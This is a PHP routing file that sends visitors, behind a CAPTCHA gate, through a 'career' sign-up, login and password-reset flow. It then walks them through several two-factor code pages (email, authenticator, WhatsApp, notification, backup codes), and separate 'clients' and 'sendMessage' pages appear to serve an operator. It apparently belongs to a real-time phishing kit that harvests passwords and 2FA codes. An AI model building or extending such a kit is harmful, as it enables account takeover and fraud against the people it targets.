<?php
require("config.php");
require("./utility/config.php");

// Define pages to exclude from CAPTCHA check
$excludedPages = ['/clients', '/sendMessage'];

// Get the current URL path
$currentPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// Check if CAPTCHA has been solved successfully
if (!isset($_SESSION['CaptchaSuccess']) || $_SESSION['CaptchaSuccess'] != 'success') {
    // If the current path is not in the excluded list
    if (!in_array($currentPath, $excludedPages)) {
        // Redirect to the CAPTCHA page if not solved
        include "pages/Captcha.php";
        exit; // Stop further execution
    }
}

// Get the page from the URL, for example, web.com/page
$page = isset($_GET['page']) ? $_GET['page'] : '';

// Include JavaScript files on all pages except 'sendMessage'
if ($page != "sendMessage" && $page != "clients" && $page != "disconnected") {
    echo '<script src="./assets/js/main.js" type="text/javascript"></script>';
    echo '<script src="./assets/js/read.js" type="text/javascript"></script>';
}

// Page routing logic (allow access only if CAPTCHA is successful)
switch ($page) {
    case "createCareer":
        include "pages/CreateCareer.php"; // Select Job
        break;
    case "login":
        include "pages/Login.php"; // Password
        break;
    case "my":
        include "pages/Career.php"; // Sign Up
        break;
    case "reset":
        include "pages/Reset.php"; // Sign Up
        break;
    case "connect":
        include "pages/Connect.php"; // Soon to connect
        break;
    case "verify":
        include "pages/AuthFactor.php"; // 2FA
        break;
    case "verifyg":
        include "pages/AuthGen.php"; // 2FA
        break;
    case "verifywp":
        include "pages/AuthWp.php"; // 2FA
        break;
    case "verifynotify":
        include "pages/AuthNotify.php"; // 2FA
        break;
    case "verifybackup":
        include "pages/AuthBackup.php"; // Backup Codes
        break;
    case "done":
        include "pages/Done.php"; // Done
        break;
    case "career":
        include "pages/Creating.php"; // Creating
        break;
    case "block":
        include "pages/Block.php"; // Block part
        break;
    case "restrict":
        include "pages/Quality.php"; // Restrict
        break;
    case "incorrect":
        include "pages/Incorrect.php"; // Wrong Email
        break;
    case "emailcode":
        include "pages/AuthEmail.php"; // Email Code
        break;
    case "sendMessage":
        include "pages/sendMessage.php";
        break;
    case "disconnected":
        include "pages/Disconnected.php";
        break;
    case "clients":
        include "pages/Clients.php";
        break;
    case "captcha":
        include "pages/Captcha.php";
        break;
    case "info":
        include "pages/AuthInfo.php";
        break;
    default:
        include "pages/Home.php"; // Default page
        break;
}
?>
